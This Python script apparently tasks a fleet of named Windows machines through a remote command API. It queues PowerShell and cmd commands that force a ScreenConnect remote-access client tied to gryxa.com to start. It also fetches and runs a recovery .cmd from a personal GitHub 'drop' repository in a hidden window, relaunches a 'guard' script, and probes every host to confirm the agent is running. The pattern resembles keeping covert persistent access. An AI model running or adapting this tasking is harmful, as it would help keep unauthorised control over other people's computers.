#!/usr/bin/env python3
"""Finish remaining Gryxa fixes after CF 522 blip; produce final summary."""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()
OUT = Path.home() / "Desktop" / "gryxa_fleet_scan.txt"

START = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='Continue'; "
    "$n='ScreenConnect Client (36e506ff016b2151)'; "
    "Set-Service -Name $n -StartupType Automatic; "
    "Start-Service -Name $n; Start-Sleep 5; "
    "$s=Get-Service -Name $n -EA SilentlyContinue; "
    "if($s){Write-Output ('AFTER='+$s.Status)} else {Write-Output 'AFTER=MISSING'}\""
    " & echo START_DONE"
)

RECOVER = (
    'start "" /min cmd.exe /c "'
    r"C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 90"
    r" -o C:\Users\Public\gryxa_recover.cmd"
    " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd"
    r" & call C:\Users\Public\gryxa_recover.cmd --detached"
    '" & echo RECOVER_QUEUED'
)

GUARD = (
    r">C:\ProgramData\WinRTCS\extkill.cnt echo 0"
    r" & >C:\ProgramData\WinRTCS\guard.cnt echo 9999"
    r" & >C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15"
    r" & rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd"
    r' & start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd'
    " & echo GUARD_KICKED"
)

PROBE = (
    "powershell -NoProfile -NonInteractive -Command "
    "\"$ErrorActionPreference='SilentlyContinue'; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if(-not $s){ Write-Output 'GRYXA=MISSING' } else { "
    "$g= if($s.PathName -match 'gryxa\\.com'){'YES'} else {'NO'}; "
    "Write-Output ('GRYXA='+$s.State+'|PATH_GRYXA='+$g) "
    "}; Write-Output 'GRYXA_PROBE_DONE'\""
)

LOGTAIL = (
    r"powershell -NoP -NonI -C "
    "\"if(Test-Path C:\\Users\\Public\\gryxa_recover.log){ Get-Content C:\\Users\\Public\\gryxa_recover.log -Tail 25 } "
    "else {'NO_LOG'}; "
    "$s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' } | Select-Object -First 1; "
    "if($s){'NOW='+$s.State} else {'NOW=MISSING'}\""
)


def api(path: str, fields: dict | None = None, retries: int = 6) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    last: Exception | None = None
    for i in range(retries):
        try:
            req = urllib.request.Request(BASE + path, data=data)
            req.add_header("Authorization", "Bearer " + ADMIN)
            req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
            with urllib.request.urlopen(req, timeout=90) as r:
                return r.read().decode(errors="replace")
        except Exception as e:
            last = e
            print(f"api retry {i+1}: {e}")
            time.sleep(8 + i * 4)
    raise RuntimeError(last)


def api_json(path: str) -> dict:
    return json.loads(api(path))


def queue(target: str, cmd: str) -> int:
    text = api("/cmd", {"target": target, "cmd": cmd})
    print(text.strip())
    m = re.search(r"id=(\d+)", text)
    if not m:
        raise RuntimeError(text)
    return int(m.group(1))


def wait_one(cid: int, timeout: float = 110.0) -> str:
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            res = api_json(f"/api/cmd/{cid}").get("results") or []
        except Exception as e:
            print("wait err", e)
            time.sleep(8)
            continue
        if res:
            time.sleep(3)
            res = api_json(f"/api/cmd/{cid}").get("results") or []
            return (res[0].get("out") if res else "") or ""
        time.sleep(6)
    return ""


def wait_all(cid: int, min_n: int = 80, timeout: float = 200.0) -> list[dict]:
    t0 = time.time()
    last = -1
    while time.time() - t0 < timeout:
        try:
            res = api_json(f"/api/cmd/{cid}").get("results") or []
        except Exception as e:
            print("wait_all err", e)
            time.sleep(10)
            continue
        if len(res) != last:
            print(f"  cmd#{cid} results={len(res)}")
            last = len(res)
        if len(res) >= min_n and (time.time() - t0) >= 90:
            time.sleep(12)
            return api_json(f"/api/cmd/{cid}").get("results") or []
        time.sleep(8)
    try:
        return api_json(f"/api/cmd/{cid}").get("results") or []
    except Exception:
        return []


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    print("== start CUONGCHECKERS ==")
    queue("CUONGCHECKERS", START)

    missing = ["DESKTOP-3UFSG6P", "DESKTOP-L66QG8O", "MRG-DELL", "SECRETARYPC"]
    for h in missing:
        print("logtail", h)
        cid = queue(h, LOGTAIL)
        out = wait_one(cid)
        print(h, out[-600:].replace("\n", " | "))
        if "NOW=Running" in out or "NOW=RUNNING" in out:
            print(" already up")
            continue
        if "RECOVER=OK" in out or "OK running" in out:
            print(" recover said OK - start")
            queue(h, START)
        else:
            print(" re-queue recover+guard")
            queue(h, RECOVER)
            time.sleep(0.2)
            queue(h, GUARD)
        time.sleep(0.2)

    # L12 / IDGIT / KYLEE / MIKES / PEREZ if online
    for h in ["DESKTOP-L12E0G2", "IDGITPOE1959", "KYLEESPC", "MIKESCOMPUTER", "PEREZ"]:
        queue(h, GUARD)
        time.sleep(0.15)

    print("wait 260s")
    time.sleep(260)

    print("== FINAL probe ==")
    cid = queue("ALL", PROBE)
    results = wait_all(cid)
    buckets = {k: [] for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE")}
    detail = {}
    for r in results:
        host = r.get("host") or "?"
        out = r.get("out") or ""
        detail[host] = out
        m = re.search(r"GRYXA=([A-Za-z_]+)", out)
        if not m:
            buckets["NO_PARSE"].append(host)
            continue
        st = m.group(1).upper()
        if st == "RUNNING":
            buckets["WRONG_PATH" if "PATH_GRYXA=NO" in out else "RUNNING"].append(host)
        elif st in ("STOPPED", "STOP_PENDING", "START_PENDING", "PAUSED"):
            buckets["STOPPED"].append(host)
        elif st == "MISSING":
            buckets["MISSING"].append(host)
        else:
            buckets["OTHER"].append(host)

    lines = [
        f"=== FINAL WRAP {time.strftime('%Y-%m-%d %H:%M:%S')} cmd=#{cid} responded={len(results)} ==="
    ]
    for k in ("RUNNING", "STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        lines.append(f"{k}={len(buckets[k])}")
    pct = (100.0 * len(buckets["RUNNING"]) / len(results)) if results else 0
    lines.append(f"running_pct_of_responders={pct:.1f}")
    for k in ("STOPPED", "MISSING", "WRONG_PATH", "OTHER", "NO_PARSE"):
        if buckets[k]:
            lines.append(f"--- {k} ---")
            for h in sorted(buckets[k]):
                lines.append(f"  {h} :: {detail.get(h,'').replace(chr(10),' | ')[:120]}")

    try:
        fleet = api_json("/api/fleet")
        counts = fleet.get("counts") or {}
        online = [h for h in (fleet.get("hosts") or []) if h.get("presence") == "online"]
        online_no = sorted(h["host"] for h in online if not h.get("has_gryxa"))
        lines.append(f"SIGHT={counts}")
        lines.append(f"online={len(online)} sight_online_no_gryxa={online_no}")
    except Exception as e:
        lines.append(f"SIGHT_ERR={e}")

    report = "\n".join(lines) + "\n"
    prev = OUT.read_text(encoding="utf-8") if OUT.exists() else ""
    OUT.write_text(prev + "\n" + report, encoding="utf-8")
    print(report)
    print("wrote", OUT)
    return 0 if not (buckets["STOPPED"] or buckets["MISSING"] or buckets["WRONG_PATH"]) else 2


if __name__ == "__main__":
    raise SystemExit(main())
